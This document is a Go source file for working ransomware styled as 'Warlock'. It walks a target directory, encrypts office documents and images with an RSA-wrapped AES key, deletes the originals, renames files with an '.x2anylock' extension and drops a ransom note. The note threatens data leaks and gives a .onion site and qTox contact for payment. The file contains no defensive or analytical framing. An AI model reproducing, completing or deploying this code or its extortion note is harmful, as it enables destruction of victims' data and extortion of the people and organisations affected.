package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

const publicKeyPEM = `-----BEGIN PUBLIC KEY-----

-----END PUBLIC KEY-----`

var fileExts = []string{".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg", ".png"}
var skipFiles = []string{"YOUR_KEY.txt", "README.txt"}

func main() {
	mode := flag.String("mode", "", "Mode: encrypt, decrypt-key, decrypt-files")
	root := flag.String("path", "", "Target directory")
	privKeyPath := flag.String("privkey", "", "Path to RSA private key file (required for decrypt-key)")
	flag.Parse()

	if *mode == "" || *root == "" {
		fmt.Println("Usage: --mode [encrypt|decrypt-key|decrypt-files] --path <target> [--privkey <file>]")
		os.Exit(1)
	}

	absRoot, err := filepath.Abs(*root)
	if err != nil {
		panic(err)
	}
	fmt.Println("[*] Target Directory:", absRoot)

	switch *mode {
	case "encrypt":
		key := generateAESKey()
		saveEncryptedKey(key, absRoot)
		cryptSystem(absRoot, key, true)
		dropRansomNote(absRoot)
	case "decrypt-key":
		if *privKeyPath == "" {
			fmt.Println("Error: --privkey is required for decrypt-key mode")
			os.Exit(1)
		}
		decryptKey(absRoot, *privKeyPath)
	case "decrypt-files":
		key := loadDecryptedKey(absRoot)
		cryptSystem(absRoot, key, false)
	default:
		fmt.Println("Invalid mode. Use encrypt, decrypt-key, or decrypt-files")
	}
}

func generateAESKey() []byte {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		panic(err)
	}
	return key
}

func saveEncryptedKey(key []byte, root string) {
	block, _ := pem.Decode([]byte(publicKeyPEM))
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		panic(err)
	}
	rsaPub := pub.(*rsa.PublicKey)
	encKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPub, key, nil)
	if err != nil {
		panic(err)
	}
	err = os.WriteFile(filepath.Join(root, "YOUR_KEY.txt"), encKey, 0600)
	if err != nil {
		panic(err)
	}
	fmt.Println("[+] Encrypted AES key saved")
}

func decryptKey(root string, privPath string) {
	encPath := filepath.Join(root, "YOUR_KEY.txt")
	if _, err := os.Stat(encPath); os.IsNotExist(err) {
		encPath += ".x2anylock"
	}

	encKey, err := os.ReadFile(encPath)
	if err != nil {
		panic(err)
	}

	privPEM, err := os.ReadFile(privPath)
	if err != nil {
		panic(fmt.Errorf("failed to read private key file: %w", err))
	}

	block, _ := pem.Decode(privPEM)
	if block == nil {
		panic("invalid PEM format in private key")
	}
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		panic(err)
	}

	key, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, encKey, nil)
	if err != nil {
		panic(err)
	}

	err = os.WriteFile(filepath.Join(root, "YOUR_KEY.txt"), key, 0600)
	if err != nil {
		panic(err)
	}
	if encPath != filepath.Join(root, "YOUR_KEY.txt") {
		os.Remove(encPath)
	}

	fmt.Println("[+] AES key decrypted and restored")
}

func loadDecryptedKey(root string) []byte {
	key, err := os.ReadFile(filepath.Join(root, "YOUR_KEY.txt"))
	if err != nil {
		panic(err)
	}
	return key
}

func cryptSystem(root string, key []byte, encrypt bool) {
	filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		absPath, err := filepath.Abs(path)
		if err != nil || !strings.HasPrefix(absPath, root) {
			return nil
		}
		name := strings.ToLower(filepath.Base(path))
		ext := strings.ToLower(filepath.Ext(path))

		if name == "your_key.txt" || name == "readme.txt" {
			fmt.Println("SKIPPED (protected):", path)
			return nil
		}

		if (!contains(fileExts, ext) && !strings.HasSuffix(name, ".x2anylock")) || strings.HasSuffix(name, ".pem") {
			return nil
		}

		if encrypt {
			encryptFile(path, key)
		} else {
			decryptFile(path, key)
		}
		return nil
	})
}

func encryptFile(path string, key []byte) {
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}
	encData, err := aesEncrypt(data, key)
	if err != nil {
		return
	}
	newPath := path + ".x2anylock"
	err = os.WriteFile(newPath, encData, 0600)
	if err == nil {
		os.Remove(path)
		fmt.Println("Encrypted:", path)
	}
}

func decryptFile(path string, key []byte) {
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}
	decData, err := aesDecrypt(data, key)
	if err != nil {
		return
	}
	origPath := strings.TrimSuffix(path, ".x2anylock")
	err = os.WriteFile(origPath, decData, 0600)
	if err == nil {
		os.Remove(path)
		fmt.Println("Decrypted:", path)
	}
}

func aesEncrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	iv := make([]byte, aes.BlockSize)
	_, err = rand.Read(iv)
	if err != nil {
		return nil, err
	}
	stream := cipher.NewCTR(block, iv)
	buf := make([]byte, len(data))
	stream.XORKeyStream(buf, data)
	return append(iv, buf...), nil
}

func aesDecrypt(data []byte, key []byte) ([]byte, error) {
	if len(data) < aes.BlockSize {
		return nil, errors.New("invalid data")
	}
	iv := data[:aes.BlockSize]
	data = data[aes.BlockSize:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	stream := cipher.NewCTR(block, iv)
	buf := make([]byte, len(data))
	stream.XORKeyStream(buf, data)
	return buf, nil
}

func dropRansomNote(root string) {
	note := `==================== WARLOCK RANSOMWARE ====================
         We are [Warlock Group], a professional hack organization. We regret to inform you that your systems have been successfully infiltrated by us,and your critical data has been encrypted.
         Additionally, we have securely backed up portions of your data to ensure the quality of our services.      
====>What Happened?
        Your systems have been locked using our advanced encryption technology. You are currently unable to access critical files or continue normal business operations. We possess the decryption key and have backed up your data to ensure its safety.
====>If You Choose to Pay:
        Swift Recovery: We will provide the decryption key and detailed guidance to restore all your data within hours.
        Data Deletion: We guarantee the permanent deletion of any backed-up data in our possession after payment, protecting your privacy.
        Professional Support: Our technical team will assist you throughout the recovery process to ensure your systems are fully restored.
        Confidentiality: After the transaction, we will maintain strict confidentiality regarding this incident, ensuring no information is disclosed.
====>If You Refuse to Pay:
        Permanent Data Loss: Encrypted files will remain inaccessible, leading to business disruptions and potential financial losses.
        Data Exposure: The sensitive data we have backed up may be publicly released or sold to third parties, severely damaging your reputation and customer trust.
        Ongoing Attacks: Your systems may face further attacks, causing even greater harm.
====>How to Contact Us?
        Please reach out through the following secure channels for further instructions(When contacting us, please provide your decrypt ID):
        ###Contact 1:
        Your decrypt ID: X2A-9482-DFQ1
        Dark Web Link: http://zshjpmblsjcbkdsifjklskdifujfdhffvsafacddfdsfdzd.onion/t0uchOs.html
        Your Chat Key: warlock-7f3a2b1c
        You can visit our website and log in with your chat key to contact us. Please note that this website is a dark web website and needs to be accessed using the Tor browser. You can visit the Tor Browser official website (https://www.torproject.org/) to download and install the Tor browser, and then visit our website.
        ###Contact 2:
        If you don't get a reply for a long time, you can also download qtox and add our ID to contact us
        Download:https://qtox.github.io/
        Warlock qTox ID: 842E99B9EC4BCFE16080AFCFD6FNJKJKGKGKGKGK7E85DB318F7B3440982637FC2847F71685DOOOORFD
        Our team is available 24/7 to provide professional and courteous assistance throughout the payment and recovery process.
        We don't need a lot of money, it's very easy for you, you can earn money even if you lose it, but your data, reputation, and public image are irreversible, so contact us as soon as possible and prepare to pay is the first priority. Please contact us as soon as possible to avoid further consequences.

============================================================`
	err := os.WriteFile(filepath.Join(root, "README.txt"), []byte(note), 0600)
	if err != nil {
		fmt.Println("Failed to drop ransom note:", err)
	} else {
		fmt.Println("Dropped ransom note")
	}
}

func contains(list []string, item string) bool {
	for _, v := range list {
		if strings.HasSuffix(item, v) {
			return true
		}
	}
	return false
}
